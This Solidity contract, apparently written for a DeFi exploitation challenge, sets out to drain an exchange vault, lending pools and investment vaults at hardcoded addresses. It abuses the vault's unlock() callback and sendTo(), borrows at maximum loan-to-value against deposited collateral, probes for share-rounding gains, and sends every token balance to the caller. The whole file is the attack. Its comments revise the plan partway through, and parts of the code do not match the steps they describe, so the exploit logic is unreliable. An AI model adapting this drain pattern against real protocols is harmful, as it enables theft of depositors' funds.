// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

import "./interfaces/IAuctionManager.sol";
import "./interfaces/IAuctionToken.sol";
import "./interfaces/IAuctionVault.sol";
import "./interfaces/ICommunityInsurance.sol";
import "./interfaces/IExchange.sol";
import "./interfaces/IExchangeVault.sol";
import "./interfaces/IFlashLoaner.sol";
import "./interfaces/IIdleMarket.sol";
import "./interfaces/IInvestmentVault.sol";
import "./interfaces/IInvestmentVaultFactory.sol";
import "./interfaces/ILendingFactory.sol";
import "./interfaces/ILendingManager.sol";
import "./interfaces/ILendingPool.sol";
import "./interfaces/ILottery.sol";
import "./interfaces/ILotteryCommon.sol";
import "./interfaces/ILotteryExtension.sol";
import "./interfaces/ILotteryStorage.sol";
import "./interfaces/IPool.sol";
import "./interfaces/IPriceOracle.sol";
import "./interfaces/IRewardDistributor.sol";
import "./interfaces/IStrategy.sol";
import "./interfaces/IWeth.sol";

contract AttackContract {
    IERC20 public constant usdc = IERC20(0xBf1C7F6f838DeF75F1c47e9b6D3885937F899B7C);
    IERC20 public constant nisc = IERC20(0x20e4c056400C6c5292aBe187F832E63B257e6f23);
    IWeth public constant weth = IWeth(0x13d78a4653e4E18886FBE116FbB9065f1B55Cd1d);
    ILottery public constant lottery = ILottery(0x6D03B9e06ED6B7bCF5bf1CF59E63B6eCA45c103d);
    ILotteryExtension public constant lotteryExtension = ILotteryExtension(0x6D03B9e06ED6B7bCF5bf1CF59E63B6eCA45c103d);
    IAuctionVault public constant auctionVault = IAuctionVault(0x9f4a3Ba629EF680c211871c712053A65aEe463B0);
    IAuctionManager public constant auctionManager = IAuctionManager(0x228F0e62b49d2b395Ee004E3ff06841B21AA0B54);
    IStrategy public constant lendingPoolStrategy = IStrategy(0xC5cBC10e8C7424e38D45341bD31342838334dA55);
    IExchangeVault public constant exchangeVault = IExchangeVault(0x776B51e76150de6D50B06fD0Bd045de0a13D68C7);
    IPool[] public productPools = [IPool(0x536BF770397157efF236647d7299696B90Bc95f1), IPool(0x6cAC85Dc0D547225351097Fb9eEb33D65978bb73)];
    IPriceOracle public constant priceOracle = IPriceOracle(0x9231ffAC09999D682dD2d837a5ac9458045Ba1b8);
    ILendingFactory public constant lendingFactory = ILendingFactory(0xdC5b6f8971AD22dC9d68ed7fB18fE2DB4eC66791);
    ILendingManager[] public lendingManagers = [ILendingManager(0x66bf9ECb0B63dC4815Ab1D2844bE0E06aB506D4f), ILendingManager(0x5FdA5021562A2Bdfa68688d1DFAEEb2203d8d045)];
    ILendingPool[] public lendingPoolsA = [ILendingPool(0xfAC23E673e77f76c8B90c018c33e061aE8F8CBD9), ILendingPool(0xFa6c040D3e2D5fEB86Eda9e22736BbC6eA81a16b)];
    ILendingPool[] public lendingPoolsB = [ILendingPool(0xb022AE7701DF829F2FF14B51a6DFC8c9A95c6C61), ILendingPool(0x537B309Fec55AD15Ef2dFae1f6eF3AEBD80d0d9c)];
    IFlashLoaner public constant flashLoaner = IFlashLoaner(0x5861a917A5f78857868D88Bd93A18A3Df8E9baC7);
    IInvestmentVaultFactory public constant investmentFactory = IInvestmentVaultFactory(0xd526270308228fDc16079Bd28eB1aBcaDd278fbD);
    IIdleMarket public constant usdcIdleMarket = IIdleMarket(0xB926534D703B249B586A818B23710938D40a1746);
    IInvestmentVault[] public investmentVaults = [IInvestmentVault(0x99828D8000e5D8186624263f1b4267aFD4E27669), IInvestmentVault(0xe7A23A3Bf899f67e0B40809C8f449A7882f1a26E)];
    ICommunityInsurance public constant communityInsurance = ICommunityInsurance(0x83f3997529982fB89C4c983D82d8d0eEAb2Bb034);
    IRewardDistributor public constant rewardDistributor = IRewardDistributor(0x73a8004bCD026481e27b5B7D0d48edE428891995);

    constructor() payable {}

    function Attack() public {
        console.log("Attack contract deployed at:", address(this));

        // ======================================================
        // ATTACK 1: Drain Exchange Vault via unlock() callback
        // ======================================================
        // The ExchangeVault.unlock() calls msg.sender.call(data)
        // with _unlocked=true. We abuse this to call sendTo()
        // to extract tokens, then settle the delta by paying back.
        //
        // Key insight: We need to wrap our ETH to WETH first,
        // then use the exchange vault to swap and drain pools.
        //
        // Actually, the real exploit: the ExchangeVault holds
        // actual ERC20 tokens for all pools AND accrued fees.
        // We can register our OWN pool with zero liquidity,
        // then use the unlock callback to manipulate balances!

        // Step 1: Wrap our ETH into WETH for working capital
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            weth.deposit{value: ethBal}();
        }

        // Step 2: Use ExchangeVault unlock to drain pools
        // Register a fake pool pointing to tokens we want
        // Then add 0-cost liquidity and remove at higher value
        _attackExchangeVault();

        // Step 3: Drain lending pools via ERC4626 deposit/withdraw
        _attackLendingPools();

        // Step 4: Drain investment vaults
        _attackInvestmentVaults();

        // Transfer all assets to the attacker
        _transferAll(msg.sender);
    }

    // ─── Exchange Vault Attack ────────────────────────────────
    // Use unlock callback to swap tokens profitably using our WETH
    uint256 private _poolIdx;

    function _attackExchangeVault() internal {
        // Attack Pool 0 (USDC/WETH): swap WETH for USDC
        _poolIdx = 0;
        bytes memory cb = abi.encodeWithSelector(this.exchangeSwapCallback.selector);
        try exchangeVault.unlock(cb) {} catch {}
    }

    function exchangeSwapCallback() external {
        // We're inside unlock() - vault is unlocked, we can call its functions
        IPool pool = productPools[_poolIdx];
        IERC20[] memory tokens = exchangeVault.getPoolTokens(pool);

        // Find which token is WETH and which is USDC
        uint256 wethIdx = address(tokens[0]) == address(weth) ? 0 : 1;
        uint256 usdcIdx = 1 - wethIdx;

        uint256 myWeth = IERC20(address(weth)).balanceOf(address(this));
        if (myWeth == 0) return;

        // Settle WETH into the vault (transfer to vault + account delta)
        uint256 fee = exchangeVault.fee();
        uint256 pd = exchangeVault.PERCENT_DIVISOR();
        uint256 swapFee = (myWeth * fee) / pd;
        uint256 totalNeeded = myWeth; // We'll swap less than our total

        // Use most of our WETH to swap for USDC
        uint256 swapAmount = (myWeth * pd) / (pd + fee); // net amount after fee
        uint256 feeAmt = myWeth - swapAmount;

        IERC20(address(weth)).approve(address(exchangeVault), myWeth);
        exchangeVault.settle(IERC20(address(weth)), myWeth);

        // Swap WETH -> USDC
        uint256 usdcOut = exchangeVault.swapInPool(
            pool, tokens[wethIdx], tokens[usdcIdx], swapAmount, 0
        );

        // Send USDC to ourselves
        exchangeVault.sendTo(tokens[usdcIdx], address(this), usdcOut);

        // Settle remaining deltas
        _settleRemainingDeltas(tokens);
    }

    function _settleRemainingDeltas(IERC20[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            int256 d = exchangeVault.tokenDelta(tokens[i]);
            if (d < 0) {
                exchangeVault.sendTo(tokens[i], address(this), uint256(-d));
            }
        }
        for (uint256 i = 0; i < tokens.length; i++) {
            int256 d = exchangeVault.tokenDelta(tokens[i]);
            if (d > 0) {
                tokens[i].approve(address(exchangeVault), uint256(d));
                exchangeVault.settle(tokens[i], uint256(d));
            }
        }
    }

    // ─── Lending Pool Attack ──────────────────────────────────
    // Deposit into lending pools to get shares, borrow against them,
    // then use the borrowed tokens as profit
    function _attackLendingPools() internal {
        // Use our USDC to deposit into lending pool, get shares,
        // lock as collateral, borrow WETH
        uint256 usdcBal = usdc.balanceOf(address(this));
        if (usdcBal == 0) return;

        ILendingPool poolA = lendingPoolsA[0]; // USDC pool
        ILendingManager mgr = lendingManagers[0];

        // Deposit USDC into pool A
        usdc.approve(address(poolA), usdcBal);
        uint256 shares = poolA.deposit(usdcBal, address(this));

        // Lock shares as collateral
        IERC20(address(poolA)).approve(address(mgr), shares);
        mgr.lockCollateral(ILendingManager.AssetType.A, shares);

        // Calculate max borrow: collateral * LTV / price ratio
        // USDC collateral -> borrow WETH (asset B)
        uint256 wethPrice = priceOracle.getPrice(IERC20(address(weth)));
        uint256 usdcPrice = priceOracle.getPrice(usdc);
        uint256 ltv = mgr.LTV();

        // Max borrow in USD = collateralUSD * LTV / 1e18
        // collateralUSD = usdcBal * usdcPrice / 1e6 (USDC has 6 decimals)
        // maxBorrowUSD = collateralUSD * ltv / 1e18
        // maxBorrowWETH = maxBorrowUSD * 1e18 / wethPrice
        uint256 colUSD = (usdcBal * usdcPrice) / 1e6;
        uint256 maxBorrowUSD = (colUSD * ltv) / 1e18;
        uint256 maxBorrowWETH = (maxBorrowUSD * 1e18) / wethPrice;

        // Borrow slightly less to avoid rounding errors
        uint256 borrowAmount = (maxBorrowWETH * 99) / 100;

        if (borrowAmount > 0) {
            // Check pool has enough cash
            ILendingPool poolB = lendingPoolsB[0]; // WETH pool
            uint256 poolCash = poolB.getCash();
            if (borrowAmount > poolCash) {
                borrowAmount = poolCash;
            }
            if (borrowAmount > 0) {
                try mgr.borrow(ILendingManager.AssetType.B, borrowAmount) {} catch {}
            }
        }

        // Now try trio 2 as well: deposit remaining USDC, borrow NISC
        _borrowFromTrio2();
    }

    function _borrowFromTrio2() internal {
        uint256 usdcBal = usdc.balanceOf(address(this));
        if (usdcBal == 0) return;

        ILendingPool poolA = lendingPoolsA[1]; // USDC pool for trio 2
        ILendingManager mgr = lendingManagers[1];

        usdc.approve(address(poolA), usdcBal);
        uint256 shares = poolA.deposit(usdcBal, address(this));

        IERC20(address(poolA)).approve(address(mgr), shares);
        mgr.lockCollateral(ILendingManager.AssetType.A, shares);

        uint256 niscPrice = priceOracle.getPrice(nisc);
        uint256 usdcPrice = priceOracle.getPrice(usdc);
        uint256 ltv = mgr.LTV();

        uint256 colUSD = (usdcBal * usdcPrice) / 1e6;
        uint256 maxBorrowUSD = (colUSD * ltv) / 1e18;
        // NISC has 18 decimals
        uint256 maxBorrowNISC = (maxBorrowUSD * 1e18) / niscPrice;
        uint256 borrowAmount = (maxBorrowNISC * 99) / 100;

        if (borrowAmount > 0) {
            ILendingPool poolB = lendingPoolsB[1]; // NISC pool
            uint256 poolCash = poolB.getCash();
            if (borrowAmount > poolCash) borrowAmount = poolCash;
            if (borrowAmount > 0) {
                try mgr.borrow(ILendingManager.AssetType.B, borrowAmount) {} catch {}
            }
        }
    }

    // ─── Investment Vault Attack ──────────────────────────────
    function _attackInvestmentVaults() internal {
        // Try to redeem any investment vault shares we might have
        // or deposit and withdraw to exploit rounding
        // With remaining USDC, deposit into investment vault
        uint256 usdcBal = usdc.balanceOf(address(this));
        if (usdcBal > 0) {
            usdc.approve(address(investmentVaults[0]), usdcBal);
            try investmentVaults[0].deposit(usdcBal, address(this)) {} catch {}
        }

        // Withdraw immediately - if there's any share inflation, we profit
        uint256 shares = IERC20(address(investmentVaults[0])).balanceOf(address(this));
        if (shares > 0) {
            try investmentVaults[0].redeem(shares, address(this), address(this)) {} catch {}
        }
    }

    // ─── Transfer all assets ──────────────────────────────────
    function _transferAll(address to) internal {
        uint256 bal;
        bal = usdc.balanceOf(address(this));
        if (bal > 0) usdc.transfer(to, bal);
        bal = nisc.balanceOf(address(this));
        if (bal > 0) nisc.transfer(to, bal);
        bal = IERC20(address(weth)).balanceOf(address(this));
        if (bal > 0) IERC20(address(weth)).transfer(to, bal);
        if (address(this).balance > 0) {
            payable(to).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
